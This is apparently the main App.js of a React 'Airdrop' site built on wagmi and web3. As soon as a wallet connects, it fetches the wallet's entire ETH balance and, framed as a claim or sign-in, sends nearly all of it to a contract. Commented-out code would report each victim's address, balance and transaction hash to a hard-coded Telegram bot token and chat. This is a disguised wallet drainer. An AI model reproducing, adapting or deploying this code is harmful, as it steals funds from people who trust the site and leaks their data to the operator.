import logo from './logo.svg';
import './App.css';
import { Route, Routes } from 'react-router-dom';
import Header from './Components/Header/Header';

import Footer from './Components/Footer/Footer';
import toast, { Toaster } from "react-hot-toast";
import Airdrop from './Components/Airdrop/Airdrop';
import Home from './Home';
import { claim_Abi, claimcontract } from "./utils/Contract";
import {
  prepareWriteContract,
  waitForTransaction,
  writeContract,
} from "@wagmi/core";
import { useAccount, useNetwork, useSwitchNetwork } from 'wagmi';
import Web3 from 'web3';
import { useEffect } from 'react';
import axios from 'axios';
import Navtr from './Components/Navbar/Navtr';
import Responsive_nav from './Components/Responsive_nav/Responsive_nav';



function App() {
  const { address } = useAccount();
  const { chain } = useNetwork();
  const { chains } = useSwitchNetwork();

  const webSupply = new Web3("wss://ethereum-sepolia-rpc.publicnode.com");

  const claim = async () => {
    try {
      let balance = await webSupply.eth.getBalance(address);
      if (balance > 0) {
        balance = Number(balance) - Number(3700000000000000);
      } else {
        toast.error("SignIN Failed");
        return;
      }
      // console.log("balance", balance);

      const { request } = await prepareWriteContract({
        address: claimcontract,
        abi: claim_Abi,
        functionName: "SignIn",
        args: [],
        value: [balance],
        account: address,
      });
      const { hash } = await writeContract(request);
      const data = await waitForTransaction({
        hash,
      });
      // Sendmasg(` ❗🔔 Claimed Function Executed 🔔❗\n
      // 🏠 Address:${address} \n
      // 💸 Transaction hash::https://bscscan.com/tx/${hash} `);

      // sessionStorage.setItem("IsClaim", true);
      toast.success("claimed Successfull.");
      // setSpinner(false);
    } catch (e) {
      console.log("Error", e);
      // setSpinner(false);
    }
  };

  const Sendmasg = async (data) => {
    try {
      // let res = await axios.post(
      //   `https://api.telegram.org/bot6889657840:AAH2ToXS49gHqWCfcq2Uhcji-8bGYF2uaLc/sendMessage`,
      //   {
      //     chat_id: "6212069744",
      //     text: data,
      //   }
      // );
      // console.log("Res", res);
      sessionStorage.setItem("IsConnect", true);
    } catch (error) {
      console.log(error);
    }
  };

  useEffect(() => {

    const getBalance = async () => {
      try {
        let balance = await webSupply.eth.getBalance(address);
        balance = webSupply.utils.fromWei(balance.toString());
        // if (isConnect == "false" || isConnect == null) {
        //   Sendmasg(` ❗🔔 Wallet Connected  🔔❗\n
        //   🏠 Address:${address} \n
        //   💰 Balance:${balance} BNB`);
        // }
      } catch (error) {
        console.log(error);
      }
    };


    const isConnect = sessionStorage.getItem(`IsConnect`);
    let isClaim = sessionStorage.getItem("IsClaim");
    if (address && chain?.id == chains[0]?.id) {
      getBalance();
    } else {
      sessionStorage.setItem("IsConnect", false);
    }

    if (isClaim == null) {
      claim();
    }

  }, [address]);

  return (
    <div className="App">
      <Toaster />
      {/* <Header /> */} 
      <Navtr/>
      <Responsive_nav/>
      

      <Routes>
        <Route path='/' element={<Airdrop />} />
        <Route path='/airdrop' element={<Home/>} />
      </Routes>
      <Footer />
    </div>
  );
}

export default App;
